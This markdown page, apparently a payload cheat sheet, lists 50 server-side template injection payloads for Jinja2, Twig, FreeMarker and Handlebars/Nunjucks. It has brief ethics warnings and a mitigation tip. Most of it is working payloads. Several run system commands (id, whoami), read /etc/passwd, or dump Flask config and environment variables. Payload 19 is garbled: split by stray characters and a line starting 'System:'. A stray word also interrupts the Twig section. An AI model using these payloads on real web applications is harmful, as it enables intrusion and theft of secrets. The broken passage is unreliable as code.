---
title: "Server-side template injection payload"
tags:
  - SSTI_injection
---

Many template engine (e.g., Jinja2, Twig, FreeMarker) exists different context (e.g., Flask, Symfony).

Server-Side Template Injection (SSTI) is a vulnerability where attackers inject malicious code into template engines (e.g., Jinja2, Twig, FreeMarker, Handlebars) used by web applications to dynamically generate content. By injecting template expressions, attackers can execute arbitrary code, access server-side data, or manipulate application logic. Below is a list of 50 example SSTI payloads tailored to various template engines. These payloads are designed to test for vulnerabilities in controlled environments.

**Warning**: These payloads are for educational and ethical testing purposes only, in controlled environments with explicit permission. Unauthorized use is illegal and unethical. Always test responsibly in a legal, authorized environment.

### SSTI Payload Characteristics
- Payloads target template engine syntax, which varies by framework (e.g., `{{ }}` for Jinja2, `{% %}` for Twig, `${}` for FreeMarker).
- Common goals include executing code, accessing sensitive data (e.g., `request`, `config`), or testing for template rendering.
- Payloads often exploit template engine features like variable access, loops, or function calls.

The payloads below cover popular template engines and include generic tests, specific engine syntax, and advanced exploitation techniques. They assume user input is directly embedded into a template (e.g., `Hello {{user_input}}`). Adapt payloads based on the suspected template engine.

### SSTI Payloads
#### Generic Detection Payloads
These test for SSTI by attempting simple operations to detect template execution.

{% raw %}
1. `{{7*7}}` - Tests if `49` is rendered (Jinja2, Handlebars, etc.).
2. `${7*7}` - Tests for FreeMarker or Velocity template engines.
3. `<% 7*7 %>` - Tests for ERB (Ruby) or JSP template engines.
4. `{{1+1}}` - Tests basic arithmetic rendering.
5. `${{1+1}}` - Tests for Nunjucks or Handlebars.
6. `{% debug %}` - Tests for Twig debug output.
7. `{{ config }}` - Attempts to dump configuration (Jinja2, Flask).
8. `{{ request }}` - Accesses request object (Jinja2, Flask).
9. `<% out.println(7*7) %>` - Tests JSP execution.
10. `{{ ''.__class__ }}` - Tests for Python class access (Jinja2).
{% endraw %}

#### Jinja2/Flask (Python) Payloads
Jinja2 is common in Flask applications, using {% raw %} `{{ }}` {% endraw %} for expressions.

{% raw %}
11. `{{ ''.__class__.__mro__ }}` - Dumps method resolution order.
12. `{{ self.__init__.__globals__ }}` - Accesses global namespace.
13. `{{ ''.__class__.__base__ }}` - Accesses base class.
14. `{{ config.items() }}` - Dumps Flask configuration.
15. `{{ get_flashed_messages.__globals__ }}` - Accesses Flask globals.
16. `{{ ''.__class__.__subclasses__() }}` - Lists all subclasses.
17. `{{ ''.__class__.__base__.__subclasses__()[59].__init__.__func__.__globals__['sys'].modules['os'].system('id') }}` - Executes system command (Linux).
18. `{{ request.application.__self__.__dict__ }}` - Dumps application context.
19. `{{ url_for.__globals__['os'].p ո
{% endraw %}

System: .popen('whoami') }}` - Attempts to execute `whoami` command (Jinja2).
{% raw %}
20. `{{ ''.join(os.listdir('/')) }}` - Lists root directory contents.
{% endraw %}

#### Twig (PHP) Payloads
Twig is used in PHP frameworks like Symfony, using {% raw %} `{{ }}` {% endraw %} and {% raw %} `{% %}`禁止

{% raw %}
21. `{{ 1+1 }}` - Tests arithmetic evaluation.
22. `{{ app.request }}` - Accesses request object.
23. `{% include '/etc/passwd' %}` - Attempts to read sensitive file.
24. `{{ _context }}` - Dumps template context.
25. `{{ dump(app) }}` - Dumps application object.
26. `{% set foo = system('id') %}{{ foo }}` - Attempts command execution.
27. `{{ constant('PHP_OS') }}` - Retrieves OS information.
28. `{% debug %}` - Outputs debug information.
29. `{{ app.session.user }}` - Accesses session user data.
30. `{% filter phpinfo %}1{% endfilter %}` - Attempts to display PHP info.
{% endraw %}

#### FreeMarker (Java) Payloads
FreeMarker is used in Java applications, using `${}` for expressions.

{% raw %}
31. `${7*7}` - Tests arithmetic evaluation.
32. `${.api}` - Dumps FreeMarker API context.
33. `${.dataModel}` - Accesses data model.
34. `${request}` - Accesses HTTP request object.
35. `${.builtIns?keys}` - Lists built-in functions.
36. `${.getClass().forName("java.lang.Runtime").getMethod("exec","java.lang.String").invoke(null,"whoami")}` - Attempts command execution.
37. `${user}` - Accesses user object.
38. `${.vars}` - Dumps all variables in scope.
39. `${System.getProperty("os.name")}` - Retrieves OS name.
40. `${.main?string}` - Dumps main template data.
{% endraw %}

#### Handlebars/Nunjucks (JavaScript) Payloads
Used in Node.js applications, using `{{ }}` or `{{{ }}}`.

{% raw %}
41. `{{ 7 * 7 }}` - Tests arithmetic evaluation.
42. `{{ global.process }}` - Accesses Node.js process object.
43. `{{{ global }}}` - Dumps global scope.
44. `{{ require('os').userInfo() }}` - Attempts to retrieve user info.
45. `{{ process.env }}` - Dumps environment variables.
46. `{{ __dirname }}` - Retrieves current directory.
47. `{{{ this }}}` - Dumps current context.
48. `{{ require('fs').readdirSync('.') }}` - Lists current directory files.
49. `{{ global.process.argv }}` - Accesses command-line arguments.
50. `{{ Object.keys(global) }}` - Lists global object keys.
{% endraw %}

### Notes
- **Template Engine Detection**: Start with generic payloads (e.g., `{{7*7}}`) to identify the engine, then use engine-specific payloads.
- **Context-Specific**: Payloads must match the template engine’s syntax and available objects (e.g., `request` in Flask, `app` in Twig).
- **Encoding**: For web inputs, payloads may need URL encoding (e.g., `{{` becomes `%7B%7B`).
- **Ethical Use**: Only test systems you own or have explicit permission to test. Unauthorized testing is illegal.
- **Mitigation**: Developers should sanitize user inputs, use safe template rendering (e.g., auto-escaping), and avoid embedding raw user input in templates.

